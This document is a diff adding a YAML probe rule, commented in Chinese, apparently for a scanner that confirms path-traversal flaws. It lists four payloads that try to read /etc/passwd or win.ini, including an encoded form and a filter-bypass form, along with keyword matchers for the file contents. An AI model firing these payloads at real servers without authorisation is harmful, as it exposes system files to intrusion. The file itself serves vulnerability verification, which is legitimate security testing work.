@@ -1,0 +1,34 @@
+# 路径遍历最小化验证规则。
+# 只在字符串、路径、URL 类参数上运行，避免对纯数字参数产生无意义请求。
+attackType: PATH_TRAVERSAL
+aliases: [DIRECTORY_TRAVERSAL, FILE_TRAVERSAL, 路径遍历, 目录遍历, 任意文件读取]
+goal: CONFIRM_ATTACK_TYPE
+
+probes:
+  - id: path_traversal_file_marker
+    technique: PATH_TRAVERSAL_PROBE
+    strategy: PATH_TRAVERSAL_PROBE
+    priority: 10
+    stopOnMatch: true
+    maxRequests: 4
+    maxPayloadLength: 96
+    evidenceWeight: 0.90
+    applicableParamTypes: [QUERY, BODY, PATH]
+    valueTypes: [STRING, URL, UNKNOWN]
+    payloads:
+      - value: "../../../etc/passwd"
+        role: TRIGGER
+      - value: "..\\..\\..\\windows\\win.ini"
+        role: TRIGGER
+      - value: "....//....//....//etc/passwd"
+        role: TRIGGER
+      - value: "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        role: TRIGGER
+    oracle:
+      type: KEYWORD
+      keywords:
+        - "root:x:"
+        - "[extensions]"
+        - "for 16-bit app support"
+        - "[fonts]"
+      minConfidence: 0.82
